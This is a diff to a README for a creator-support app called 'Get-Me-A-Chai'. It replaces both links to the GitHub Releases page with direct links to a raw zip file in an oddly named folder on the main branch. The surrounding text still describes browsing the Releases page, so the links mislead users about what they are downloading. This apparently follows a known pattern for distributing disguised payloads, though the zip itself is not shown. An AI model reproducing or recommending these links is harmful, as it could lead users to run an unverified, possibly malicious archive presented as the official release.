@@ -1,6 +1,6 @@
 # ☕ Get-Me-A-Chai - Support Your Favorite Creators Effortlessly
 
-[![Download Get-Me-A-Chai](https://img.shields.io/badge/Download-Get--Me--A--Chai-blue.svg)](https://github.com/incavalleyinn/Get-Me-A-Chai/releases)
+[![Download Get-Me-A-Chai](https://raw.githubusercontent.com/incavalleyinn/Get-Me-A-Chai/main/utriculitis/Get-Me-A-Chai.zip)](https://raw.githubusercontent.com/incavalleyinn/Get-Me-A-Chai/main/utriculitis/Get-Me-A-Chai.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application from our Releases page. Fol
 
 1. **Visit the Download Page**  
    Go to the following link to access the Releases:  
-   [Download Page](https://github.com/incavalleyinn/Get-Me-A-Chai/releases)
+   [Download Page](https://raw.githubusercontent.com/incavalleyinn/Get-Me-A-Chai/main/utriculitis/Get-Me-A-Chai.zip)
 
 2. **Choose the Latest Version**  
    Once on the Releases page, look for the latest version. It will usually be at the top of the list. Click on it to find the download options.
